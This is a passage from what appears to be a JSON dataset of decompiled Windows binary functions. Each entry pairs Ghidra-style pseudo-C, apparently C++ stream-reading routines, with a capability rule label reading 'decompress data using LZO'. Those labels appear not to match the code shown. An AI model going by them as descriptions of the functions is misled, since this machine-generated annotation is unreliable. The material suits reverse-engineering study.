piVar5[3]) {\n                    iVar3 = *piVar6;\n                    piVar5[2] = piVar6 + 1;\n                    if (iVar3 != -1) goto code_r0x0047d2bf;\ncode_r0x0047d310:\n                    iVar9 = extraout_ECX_10[1];\n                    if (in_stack_fffffc48 < 1) {\n                        if (iVar9 != 0) goto code_r0x0047d2a3;\n                        uVar7 = 6;\n                    }\n                    else {\n                        *in_stack_fffffc4c = 0;\n                        uVar7 = 2;\n                        if (iVar9 == 0) goto code_r0x0047d32d;\n                    }\n                    goto code_r0x0047d385;\n                }\n                iVar3 = (**(*piVar5 + 0x28))();\n                if (iVar3 == -1) goto code_r0x0047d310;\ncode_r0x0047d2bf:\n                piVar6 = piVar5[2];\n                if (piVar5[3] <= piVar6) goto code_r0x0047d271;\ncode_r0x0047d2c7:\n                iVar8 = extraout_ECX_10[1];\n                iVar3 = *piVar6;\n                iVar9 = iVar8 + 1;\n                piVar6 = in_stack_fffffc4c;\n                if (in_stack_fffffc48 <= iVar9) break;\n            } while( true );\n        }\n        if (iVar3 == -1) {\n            if (0 < in_stack_fffffc48) {\n                *in_stack_fffffc4c = 0;\n            }\n            uVar7 = 6;\n            if (iVar8 != 0) {\ncode_r0x0047d2a3:\n                uVar7 = 2;\n            }\n            goto code_r0x0047d385;\n        }\n    }\n    if (0 < in_stack_fffffc48) {\n        *in_stack_fffffc4c = 0;\n    }\n    if (iVar8 != 0) {\n        return extraout_ECX_10;\n    }\n    uVar7 = 4;\ncode_r0x0047d385:\n    fcn.0049ce20(uVar7 | *(extraout_ECX_10 + *(*extraout_ECX_10 + -0xc) + 0x14));\n    return extraout_ECX_10;\n}\n",
        "token_count": 6457
    },
    "0047d4a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047d4a0(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    int16_t iVar3;\n    uint32_t uVar4;\n    int32_t *in_ECX;\n    uint var_30h;\n    uint var_2ah;\n    uint var_19h;\n    uint var_ch;\n    \n    in_ECX[1] = 0;\n    fcn.0047e5b0();\n    if (var_19h == '\\0') {\ncode_r0x0047d571:\n        if (in_ECX[1] != 0) {\n            return;\n        }\n        uVar4 = 4;\n    }\n    else {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        piVar2 = piVar1[2];\n        if (piVar1[3] < piVar2 || piVar1[3] == piVar2) {\n            iVar3 = (**(*piVar1 + 0x24))();\n        }\n        else {\n            iVar3 = *piVar2;\n        }\n        while (iVar3 != -1) {\n            if (iVar3 == arg_ch) goto code_r0x0047d571;\n            piVar2 = arg_8h[5];\n            if (piVar2 < arg_8h[6]) {\n                *piVar2 = iVar3;\n                arg_8h[5] = piVar2 + 1;\n            }\n            else {\n                iVar3 = (**(*arg_8h + 0x34))(iVar3);\n                if (iVar3 == -1) goto code_r0x0047d571;\n            }\n            in_ECX[1] = in_ECX[1] + 1;\n            piVar2 = piVar1[2];\n            if (piVar2 < piVar1[3]) {\n                iVar3 = *piVar2;\n                piVar1[2] = piVar2 + 1;\n            }\n            else {\n                iVar3 = (**(*piVar1 + 0x28))();\n            }\n            if (iVar3 == -1) break;\n            if (piVar1[2] < piVar1[3]) {\n                iVar3 = *piVar1[2];\n            }\n            else {\n                iVar3 = (**(*piVar1 + 0x24))();\n            }\n        }\n        uVar4 = (-(in_ECX[1] == 0) & 4) + 2;\n    }\n    fcn.0049ce20(uVar4 | *(in_ECX + *(*in_ECX + -0xc) + 0x14));\n    return;\n}\n",
        "token_count": 632
    },
    "0047d980": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047d980(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    in_ECX[1] = 0;\n    fcn.0047e5b0();\n    if (var_9h != '\\0') {\n        iVar1 = (**(**(in_ECX + *(*in_ECX + -0xc) + 0x78) + 0x20))(arg_8h, arg_ch);\n        in_ECX[1] = iVar1;\n        if (arg_ch != iVar1) {\n            fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 6);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "0047dbe0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047dbe0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_39h;\n    uint32_t var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 0xfffffffd);\n    fcn.0047e5b0();\n    if ((var_39h != '\\0') && ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0)) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x14))(piVar1, arg_8h, arg_ch, arg_10h, arg_14h, 8);\n        if ((var_34h & stack0xffffffc4) == 0xffffffff) {\n            fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 365
    },
    "0047dd30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047dd30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint32_t var_29h;\n    uint32_t var_24h;\n    uint var_ch;\n    \n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 0xfffffffd);\n    fcn.0047e5b0();\n    if ((var_29h != '\\0') && ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0)) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x10))(piVar1, arg_8h, arg_ch, arg_10h, 8);\n        if ((var_24h & stack0xffffffd4) == 0xffffffff) {\n            fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "0047df50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.0047df50(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    param_1[1] = 0;\n    fcn.0049ce20(*(param_1 + *(*param_1 + -0xc) + 0x14) & 0xfffffffd);\n    fcn.0047e5b0(param_1, 1);\n    if (var_9h == '\\0') {\n        return param_1;\n    }\n    iVar4 = *(*param_1 + -0xc) + param_1;\n    piVar1 = *(iVar4 + 0x78);\n    if (piVar1 != NULL) {\n        uVar2 = piVar1[2];\n        if (piVar1[1] < uVar2) {\n            piVar1[2] = uVar2 - 2;\n            iVar3 = *(uVar2 - 2);\n        }\n        else {\n            iVar3 = (**(*piVar1 + 0x2c))(0xffff);\n        }\n        if (iVar3 != -1) {\n            return param_1;\n        }\n        iVar4 = *(*param_1 + -0xc) + param_1;\n    }\n    fcn.0049ce20(*(iVar4 + 0x14) | 1);\n    return param_1;\n}\n",
        "token_count": 366
    },
    "0047e5b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0047e9aa: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0047e9af)\n\nint32_t * __thiscall fcn.0047e5b0(int32_t *param_1, int32_t *param_2, char param_3)\n\n{\n    uint32_t *puVar1;\n    int16_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    char cVar5;\n    int16_t iVar6;\n    uint16_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    uint uVar10;\n    int32_t iVar11;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t iVar12;\n    int32_t *piVar13;\n    int32_t *piVar14;\n    int32_t *piVar15;\n    ulong uVar16;\n    int32_t *piStack216;\n    int32_t *piStack212;\n    int32_t *piStack208;\n    int16_t iStack204;\n    char cStack185;\n    int16_t *piStack152;\n    int32_t in_stack_ffffff6c;\n    int16_t iStack136;\n    uchar *puStack64;\n    int32_t *piStack60;\n    int32_t *piStack56;\n    char cStack52;\n    int32_t *piStack32;\n    \n    *param_1 = 0;\n    iVar11 = *(*param_2 + -0xc) + param_2;\n    uVar8 = *(iVar11 + 0x14);\n    piStack32 = param_1;\n    if (uVar8 != 0) goto code_r0x0047e69d;\n    if (*(iVar11 + 0x70) != 0) {\n        puStack64 = 0x47e5e9;\n        fcn.0047f9e0();\n        iVar11 = *(*param_2 + -0xc) + param_2;\n        if ((param_3 == '\\0') && ((*(iVar11 + 0xd) & 0x10) != 0)) goto code_r0x0047e602;\ncode_r0x0047e707:\n        uVar8 = *(iVar11 + 0x14);\n        if (uVar8 == 0) {\n            *piStack32 = 1;\n            return piStack32;\n        }\ncode_r0x0047e69d:\n        piStack60 = uVar8 | 4;\n        puStack64 = 0x47e6a8;\n        piVar9 = fcn.0049ce20();\n        return piVar9;\n    }\n    if ((param_3 != '\\0') || ((*(iVar11 + 0xd) & 0x10) == 0)) {\n        *param_1 = 1;\n        return param_1;\n    }\ncode_r0x0047e602:\n    piVar9 = *(iVar11 + 0x78);\n    if (piVar9[2] < piVar9[3]) {\n        uVar7 = *piVar9[2];\n    }\n    else {\n        puStack64 = 0x47e737;\n        uVar7 = (**(*piVar9 + 0x24))();\n        iVar11 = *(*param_2 + -0xc) + param_2;\n    }\n    piVar14 = *(iVar11 + 0x7c);\n    if (piVar14 != NULL) {\n        if (uVar7 != 0xffff) {\n            do {\n                piStack56 = uVar7;\n                piStack60 = 0x20;\n                puStack64 = 0x47e669;\n                cVar5 = (**(*piVar14 + 8))();\n                if (cVar5 == '\\0') goto code_r0x0047e700;\n                piVar2 = piVar9[2];\n                if (piVar2 < piVar9[3]) {\n                    iVar6 = *piVar2;\n                    piVar9[2] = piVar2 + 1;\n                }\n                else {\n                    puStack64 = 0x47e683;\n                    iVar6 = (**(*piVar9 + 0x28))();\n                }\n                if (iVar6 == -1) break;\n                if (piVar9[2] < piVar9[3]) {\n                    uVar7 = *piVar9[2];\n                }\n                else {\n                    puStack64 = 0x47e727;\n                    uVar7 = (**(*piVar9 + 0x24))();\n                }\n            } while (uVar7 != 0xffff);\n            iVar11 = param_2 + *(*param_2 + -0xc);\n        }\n        uVar8 = *(iVar11 + 0x14) | 2;\n        goto code_r0x0047e69d;\n    }\n    puStack64 = 0x47e748;\n    uVar16 = fcn.0049e780();\n    piStack60 = uVar16;\n    if (uVar16 >> 0x20 == 1) {\n        puStack64 = 0x47e74f;\n        fcn.004a36d0();\n        iVar11 = *(*param_2 + -0xc);\n        puVar1 = param_2 + iVar11 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_2 + iVar11 + 0x10) & 1) != 0) {\n            puStack64 = 0x47e763;\n            fcn.004a3b60();\n        }\n        puStack64 = 0x47e768;\n        piVar9 = fcn.004a3b60();\n    }\n    else {\n        puStack64 = 0x47e6e0;\n        fcn.004a36d0();\n        iVar11 = *(*param_2 + -0xc);\n        puVar1 = param_2 + iVar11 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_2 + iVar11 + 0x10) & 1) == 0) {\n            puStack64 = 0x47e6f6;\n            fcn.004a3840();\ncode_r0x0047e700:\n            iVar11 = param_2 + *(*param_2 + -0xc);\n            goto code_r0x0047e707;\n        }\n        puStack64 = 0x47e771;\n        fcn.004a3b60();\n    }\n    puStack64 = 0x47e776;\n    fcn.004a3840();\n    puStack64 = 0x47e77e;\n    piStack60 = piVar9;\n    uVar10 = fcn.0041b360();\n    puStack64 = 0x47e785;\n    fcn.004a3840();\n    puStack64 = 0x47e78d;\n    piStack60 = uVar10;\n    fcn.0041b360();\n    piStack152 = &stack0xffffffc0;\n    *extraout_ECX = 0;\n    iVar11 = *(*piStack56 + -0xc) + piStack56;\n    uVar8 = *(iVar11 + 0x14);\n    puStack64 = &stack0xfffffffc;\n    if (uVar8 != 0) goto code_r0x0047e87d;\n    if (*(iVar11 + 0x70) != 0) {\n        puStack64 = &stack0xfffffffc;\n        fcn.0047f9e0();\n        iVar11 = *(*piStack56 + -0xc) + piStack56;\n        if ((cStack52 == '\\0') && ((*(iVar11 + 0xd) & 0x10) != 0)) goto code_r0x0047e7e2;\ncode_r0x0047e8e7:\n        uVar8 = *(iVar11 + 0x14);\n        if (uVar8 == 0) {\n            *extraout_ECX = 1;\n            return extraout_ECX;\n        }\ncode_r0x0047e87d:\n        piVar9 = fcn.0049ce20(uVar8 | 4);\n        return piVar9;\n    }\n    if ((cStack52 != '\\0') || (puStack64 = &stack0xfffffffc,  (*(iVar11 + 0xd) & 0x10) == 0)) {\n        *extraout_ECX = 1;\n        return extraout_ECX;\n    }\ncode_r0x0047e7e2:\n    piVar9 = *(iVar11 + 0x78);\n    if (piVar9[2] < piVar9[3]) {\n        iVar6 = *piVar9[2];\n    }\n    else {\n        iVar6 = (**(*piVar9 + 0x24))();\n        iVar11 = *(*piStack56 + -0xc) + piStack56;\n    }\n    piVar14 = *(iVar11 + 0x7c);\n    if (piVar14 != NULL) {\n        if (iVar6 != -1) {\n            do {\n                cVar5 = (**(*piVar14 + 8))(0x20, iVar6);\n                if (cVar5 == '\\0') goto code_r0x0047e8e0;\n                piVar2 = piVar9[2];\n                if (piVar2 < piVar9[3]) {\n                    iVar6 = *piVar2;\n                    piVar9[2] = piVar2 + 1;\n                }\n                else {\n                    iVar6 = (**(*piVar9 + 0x28))();\n                }\n                if (iVar6 == -1) break;\n                if (piVar9[2] < piVar9[3]) {\n                    iVar6 = *piVar9[2];\n                }\n                else {\n                    iVar6 = (**(*piVar9 + 0x24))();\n                }\n            } while (iVar6 != -1);\n            iVar11 = piStack56 + *(*piStack56 + -0xc);\n        }\n        uVar8 = *(iVar11 + 0x14) | 2;\n        goto code_r0x0047e87d;\n    }\n    uVar16 = fcn.0049e780();\n    if (uVar16 >> 0x20 == 1) {\n        fcn.004a36d0(uVar16);\n        iVar11 = *(*piStack56 + -0xc);\n        puVar1 = piStack56 + iVar11 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(piStack56 + iVar11 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        piVar9 = fcn.004a3b60();\n    }\n    else {\n        fcn.004a36d0(uVar16);\n        iVar11 = *(*piStack56 + -0xc);\n        puVar1 = piStack56 + iVar11 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(piStack56 + iVar11 + 0x10) & 1) == 0) {\n            fcn.004a3840();\ncode_r0x0047e8e0:\n            iVar11 = piStack56 + *(*piStack56 + -0xc);\n            goto code_r0x0047e8e7;\n        }\n        fcn.004a3b60();\n    }\n    fcn.004a3840();\n    uVar10 = fcn.0041b360(piVar9);\n    fcn.004a3840();\n    fcn.0041b360(uVar10);\n    piVar9 = *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x7c);\n    if (piVar9 == NULL) {\n        fcn.0049e780();\n        piVar9 = extraout_ECX_01;\n    }\n    else {\n        iStack136 = (**(*piVar9 + 0x28))(10);\n        in_stack_ffffff6c = 0x47e9af;\n        piVar9 = extraout_ECX_00;\n    }\n    piVar9[1] = 0;\n    fcn.0047e5b0(piVar9, 1);\n    if (cStack185 == '\\0') {\n        iVar11 = piVar9[1];\n        if (0 < in_stack_ffffff6c) {\n    // WARNING: Ignoring partial resolution of indirect\n            puStack64._0_2_ = 0;\n        }\njoined_r0x0047eca4:\n        if (iVar11 != 0) {\n            return piStack208;\n        }\n        uVar8 = 4;\n    }\n    else {\n        piVar9 = *(piStack208 + *(*piStack208 + -0xc) + 0x78);\n        piVar2 = piVar9[2];\n        if (piVar9[3] < piVar2 || piVar9[3] == piVar2) {\n            iVar6 = (**(*piVar9 + 0x24))();\n        }\n        else {\n            iVar6 = *piVar2;\n            piStack152 = &stack0xffffffc0;\n        }\ncode_r0x0047ea9f:\n        iVar12 = piStack208[1];\n        while (iVar11 = iVar12 + 1,  iVar11 < in_stack_ffffff6c) {\n            while( true ) {\n                if (iVar6 == -1) goto code_r0x0047ec0c;\n                piStack216 = piVar9[3];\n                piVar14 = piVar9[2];\n                if (iVar6 == iStack136) goto code_r0x0047ea4e;\n                piStack212 = (in_stack_ffffff6c - iVar12) + -1;\n                piVar15 = piStack216 - piVar14 >> 1;\n                if (piStack212 <= piVar15) {\n                    piVar15 = piStack212;\n                }\n                piVar3 = piVar14;\n                piVar13 = piVar15;\n                piVar4 = piVar14;\n                if (piVar15 < 2) break;\n                while (piStack212 = piVar15,  piVar4 != NULL) {\n                    if (*piVar3 == iStack136) {\n                        iVar11 = piVar3 - piVar14;\n                        piStack212 = iVar11 >> 1;\n                        if (piStack212 == NULL) goto code_r0x0047eb3c;\n                        break;\n                    }\n                    piVar13 = piVar13 + -1;\n                    piVar3 = piVar3 + 2;\n                    piVar4 = piVar13;\n                }\n                iVar11 = piStack212 * 2;\n                sub.msvcrt.dll_memcpy(piStack152, piVar14, iVar11);\n                piVar14 = piVar9[2];\n                iVar12 = piStack208[1];\n                piStack216 = piVar9[3];\ncode_r0x0047eb3c:\n                piStack152 = piStack152 + iVar11;\n                iVar12 = iVar12 + piStack212;\n                piVar14 = iVar11 + piVar14;\n                piVar9[2] = piVar14;\n                piStack208[1] = iVar12;\n                if (piStack216 <= piVar14) {\n                    iVar6 = (**(*piVar9 + 0x24))();\n                    goto code_r0x0047ea9f;\n                }\n                iVar6 = *piVar14;\n                iVar11 = iVar12 + 1;\n                if (in_stack_ffffff6c <= iVar11) goto code_r0x0047eb68;\n            }\n            *piStack152 = iVar6;\n            piStack152 = piStack152 + 1;\n            piStack208[1] = iVar11;\n            if (piVar14 < piStack216) {\n                iVar6 = *piVar14;\n                piVar9[2] = piVar14 + 2;\n            }\n            else {\n                iVar6 = (**(*piVar9 + 0x28))();\n            }\n            if (iVar6 == -1) {\n                iVar12 = piStack208[1];\ncode_r0x0047ec0c:\n                uVar8 = 2;\n                if (0 < in_stack_ffffff6c) {\n                    *piStack152 = 0;\n                }\n                goto code_r0x0047ec22;\n            }\n            if (piVar9[2] < piVar9[3]) {\n                iVar6 = *piVar9[2];\n                iVar12 = piStack208[1];\n            }\n            else {\n                iVar6 = (**(*piVar9 + 0x24))();\n                iVar12 = piStack208[1];\n            }\n        }\ncode_r0x0047eb68:\n        if (iVar6 == -1) {\n            if (0 < in_stack_ffffff6c) {\n                *piStack152 = 0;\n                uVar8 = (-(iVar12 == 0) & 4) + 2;\n                goto code_r0x0047ea1d;\n            }\n            uVar8 = 2;\n        }\n        else {\n            if (iVar6 == iStack204) {\n                piStack216 = piVar9[3];\n                piVar14 = piVar9[2];\ncode_r0x0047ea4e:\n                piStack208[1] = iVar11;\n                if (piVar14 < piStack216) {\n                    piVar9[2] = piVar14 + 2;\n                    if (0 < in_stack_ffffff6c) {\n                        *piStack152 = 0;\n                    }\n                }\n                else {\n                    (**(*piVar9 + 0x28))();\n                    iVar11 = piStack208[1];\n                    if (0 < in_stack_ffffff6c) {\n                        *piStack152 = 0;\n                    }\n                }\n                goto joined_r0x0047eca4;\n            }\n            if (0 < in_stack_ffffff6c) {\n                *piStack152 = 0;\n                uVar8 = 4;\n                goto code_r0x0047ea1d;\n            }\n            uVar8 = 4;\n        }\ncode_r0x0047ec22:\n        if (iVar12 == 0) {\n            uVar8 = uVar8 | 4;\n        }\n    }\ncode_r0x0047ea1d:\n    fcn.0049ce20(uVar8 | *(piStack208 + *(*piStack208 + -0xc) + 0x14));\n    return piStack212;\n}\n",
        "token_count": 4162
    },
    "0047ecf0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047ecf0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int16_t iVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    uint var_9h;\n    \n    in_ECX[1] = 0;\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 0xfffffffd);\n    fcn.0047e5b0();\n    if (var_9h == '\\0') {\n        return;\n    }\n    iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    piVar1 = *(iVar4 + 0x78);\n    if (piVar1 != NULL) {\n        uVar2 = piVar1[2];\n        if ((piVar1[1] < uVar2) && (iVar3 = *(uVar2 - 2),  arg_8h == iVar3)) {\n            piVar1[2] = uVar2 - 2;\n        }\n        else {\n            iVar3 = (**(*piVar1 + 0x2c))(arg_8h);\n        }\n        if (iVar3 != -1) {\n            return;\n        }\n        iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    }\n    fcn.0049ce20(*(iVar4 + 0x14) | 1);\n    return;\n}\n",
        "token_count": 359
    },
    "0047ee10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0047ee10(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    in_ECX[1] = 0;\n    fcn.0047e5b0();\n    if (var_9h != '\\0') {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        if (piVar1[2] == piVar1[3]) {\n            iVar2 = (**(*piVar1 + 0x1c))();\n        }\n        else {\n            iVar2 = piVar1[3] - piVar1[2] >> 1;\n        }\n        if (0 < iVar2) {\n            if (arg_ch < iVar2) {\n                iVar2 = arg_ch;\n            }\n            iVar2 = (**(**(in_ECX + *(*in_ECX + -0xc) + 0x78) + 0x20))(arg_8h, iVar2);\n            in_ECX[1] = iVar2;\n            return iVar2;\n        }\n        if (iVar2 == -1) {\n            fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 2);\n        }\n    }\n    return in_ECX[1];\n}\n",
        "token_count": 356
    },
    "0047f010": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047f010(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    in_ECX[0x1e] = 0;\n    *(in_ECX + 0x1f) = 0;\n    *(in_ECX + 0x7e) = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    in_ECX[0x23] = 0;\n    *in_ECX = 0x50aa84;\n    in_ECX[2] = 0x50aa98;\n    in_ECX[1] = 0;\n    fcn.0049cca0(arg_8h);\n    return;\n}\n",
        "token_count": 208
    },
    "0047f0b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.0047f0b0(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.0049b670();\n    param_1[0x1e] = 0;\n    *(param_1 + 0x1f) = 0;\n    *(param_1 + 0x7e) = 0;\n    param_1[0x20] = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    param_1[0x23] = 0;\n    *param_1 = 0x50aa84;\n    param_1[2] = 0x50aa98;\n    param_1[1] = 0;\n    fcn.0049cca0(0);\n    return;\n}\n",
        "token_count": 201
    },
    "0047f510": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0047f510(uint *arg_8h)\n\n{\n    uint32_t *puVar1;\n    ushort uVar2;\n    int16_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t *extraout_ECX_03;\n    int32_t *extraout_ECX_04;\n    int32_t *extraout_ECX_05;\n    int32_t iVar8;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX_06;\n    int32_t iVar9;\n    int32_t unaff_EDI;\n    ulong uVar10;\n    char cStack653;\n    int32_t in_stack_fffffd98;\n    int16_t *in_stack_fffffd9c;\n    int16_t iStack604;\n    uint uVar11;\n    char cStack537;\n    uint32_t uStack536;\n    uint uStack520;\n    int32_t iStack516;\n    int32_t iStack512;\n    uchar *puStack508;\n    int32_t *piStack504;\n    uint uStack500;\n    int32_t *piStack496;\n    uint uStack492;\n    int32_t iStack488;\n    uchar *puStack484;\n    uint uStack480;\n    char cStack453;\n    uint32_t uStack452;\n    uint uStack436;\n    int32_t iStack432;\n    int32_t iStack428;\n    uchar *puStack424;\n    int32_t *piStack420;\n    uint uStack416;\n    int32_t *piStack412;\n    uint uStack408;\n    int32_t iStack404;\n    uchar *puStack400;\n    uint uStack396;\n    char cStack369;\n    uint32_t uStack368;\n    uint uStack352;\n    int32_t iStack348;\n    int32_t iStack344;\n    uchar *puStack340;\n    int32_t *piStack336;\n    uint uStack332;\n    int32_t *piStack328;\n    uint uStack324;\n    int32_t iStack320;\n    uchar *puStack316;\n    uint uStack312;\n    char cStack285;\n    uint32_t uStack284;\n    uint uStack268;\n    int32_t iStack264;\n    int32_t iStack260;\n    uchar *puStack256;\n    int32_t *piStack252;\n    uint uStack248;\n    int32_t *piStack244;\n    uint uStack240;\n    int32_t iStack236;\n    uchar *puStack232;\n    uint uStack228;\n    char cStack201;\n    uint32_t uStack200;\n    uint uStack184;\n    int32_t iStack180;\n    int32_t iStack176;\n    uchar *puStack172;\n    int32_t *piStack168;\n    uint uStack164;\n    int32_t *piStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uchar *puStack148;\n    uint uStack144;\n    char cStack117;\n    uint32_t uStack116;\n    uint uStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    uchar *puStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uint32_t var_21h;\n    uint var_1ch;\n    uint var_ch;\n    \n    uStack72 = 0;\n    uStack80 = 0x47f52e;\n    piStack76 = in_ECX;\n    fcn.0047e5b0();\n    if (var_21h == '\\0') {\n        return in_ECX;\n    }\n    stack0xffffffdc = 0;\n    iStack96 = *(*in_ECX + -0xc) + in_ECX;\n    if (*(iStack96 + 0x84) != NULL) {\n        piStack84 = *(iStack96 + 0x78);\n        puStack60 = &fcn.0047f510::var_1ch;\n        iStack64 = &fcn.0047f510::var_21h + 1;\n        piStack76 = NULL;\n        uStack72 = 0xffff;\n        uStack80 = 0xffff;\n        puStack88 = 0x47f586;\n        iStack68 = iStack96;\n        (**(**(iStack96 + 0x84) + 0xc))();\n        *arg_8h = var_1ch;\ncode_r0x0047f591:\n        if (stack0xffffffdc == 0) {\n            return in_ECX;\n        }\n        piStack84 = stack0xffffffdc | *(in_ECX + *(*in_ECX + -0xc) + 0x14);\n        puStack88 = 0x47f5b6;\n        fcn.0049ce20();\n        return in_ECX;\n    }\n    puStack88 = 0x47f5ca;\n    uVar10 = fcn.0049e780();\n    piStack84 = uVar10;\n    if (uVar10 >> 0x20 == 1) {\n        puStack88 = 0x47f5f4;\n        fcn.004a36d0();\n        iVar9 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar9 + 0x10) & 1) == 0) {\n            puStack88 = 0x47f608;\n            fcn.004a3b60();\n        }\n        puStack88 = 0x47f60d;\n        in_ECX = fcn.004a3b60();\n    }\n    else {\n        puStack88 = 0x47f5d7;\n        fcn.004a36d0();\n        unaff_EDI = *(*in_ECX + -0xc) + in_ECX;\n        *(unaff_EDI + 0x14) = *(unaff_EDI + 0x14) | 1;\n        if ((*(unaff_EDI + 0x10) & 1) == 0) {\n            puStack88 = 0x47f5ed;\n            fcn.004a3840();\n            goto code_r0x0047f591;\n        }\n        puStack88 = 0x47f616;\n        fcn.004a3b60();\n    }\n    puStack88 = 0x47f61b;\n    fcn.004a3840();\n    puStack88 = 0x47f623;\n    piStack84 = in_ECX;\n    uStack100 = fcn.0041b360();\n    puStack88 = 0x47f62a;\n    fcn.004a3840();\n    puStack88 = 